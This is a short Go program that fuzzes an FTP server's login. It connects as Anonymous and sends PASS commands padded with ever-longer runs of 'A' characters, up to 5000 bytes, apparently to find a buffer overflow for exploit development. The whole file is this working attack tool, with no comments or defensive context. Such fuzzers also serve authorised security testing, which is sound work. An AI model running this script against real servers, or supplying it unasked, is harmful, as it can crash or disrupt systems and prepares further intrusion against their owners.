package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func main() {

	for i := 100; i < 5000; i += 100 {
		target := os.Args[1]
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			panic(err)
		}

		buf := strings.Repeat("A", i)
		reader := bufio.NewReader(conn)
		reader.ReadBytes('\n')

		payload := fmt.Sprintf("PASS %v\r\n", buf)
		conn.Write([]byte("USER Anonymous\r\n"))
		reader.ReadBytes('\n')

		fmt.Printf("Writing %d bytes...\n", i)
		conn.Write([]byte(payload))
		reader.ReadBytes('\n')
		conn.Close()
	}
}
